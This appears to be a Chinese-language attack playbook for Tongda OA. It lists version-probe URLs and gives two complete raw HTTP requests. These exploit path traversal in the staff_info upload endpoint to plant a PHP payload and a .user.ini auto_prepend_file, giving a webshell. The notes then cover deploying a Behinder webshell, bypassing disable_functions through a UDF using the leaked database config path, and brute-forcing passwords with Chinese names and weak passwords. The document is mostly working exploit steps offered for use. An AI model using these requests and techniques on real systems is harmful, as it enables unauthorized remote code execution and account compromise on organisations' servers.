# 版本探测
```
http://192.168.0.116/inc/expired.php
http://192.168.0.116/attachment/im/update/pc/11/update.ini
```

# 后台getshell
用登录后的Cookie替换当前Cookie，然后发送如下数据包，上传非php后缀的webshell
```
POST /general/hr/manage/staff_info/add.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/t HTTP/1.1
Host: 192.168.16.134
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104
Content-Length: 355
Connection: close
Cookie: PHPSESSID=tmt91udefgmh578i4fdktfvbu2; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=df71e7c
Upgrade-Insecure-Requests: 1

-----------------------------17518323986548992951984057104
Content-Disposition: form-data; name="ATTACHMENT"; filename="t.log"
Content-Type: text/plain

<?php echo "ybdt"; ?>
-----------------------------17518323986548992951984057104
Content-Disposition: form-data; name="submit"

提交
-----------------------------17518323986548992951984057104--
```

再次发送如下数据包，包含非php后缀的webshell
```
POST /general/hr/manage/staff_info/add.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user HTTP/1.1
Host: 192.168.16.134
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104
Content-Length: 357
Connection: close
Cookie: PHPSESSID=tmt91udefgmh578i4fdktfvbu2; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=df71e7c
Upgrade-Insecure-Requests: 1

-----------------------------17518323986548992951984057104
Content-Disposition: form-data; name="ATTACHMENT"; filename="t.ini"
Content-Type: text/plain

auto_prepend_file=t.log
-----------------------------17518323986548992951984057104
Content-Disposition: form-data; name="submit"

提交
-----------------------------17518323986548992951984057104--
```

测试没有问题后再上传冰蝎的webshell，最后访问冰蝎webshell
```
http://192.168.16.138/general/reportshop/workshop/report/attachment-remark/reply_submit.php
```

# 绕过disable_functions
上传udf.php，输入下载到的数据库配置信息，配置信息位于
```
C:/MOYA/webroot/inc/oa_config.php
```

# 用户密码爆破
经研究发现，用户名多为常见中国姓名，密码可采用姓名/姓名变形/常见弱口令，或通达OA内置字典

# 额外
经研究发现另一处可上传路径
```
webroot/general/netdisk下很多文件均有可能

/attachment/im/update/pc/11/update.ini
```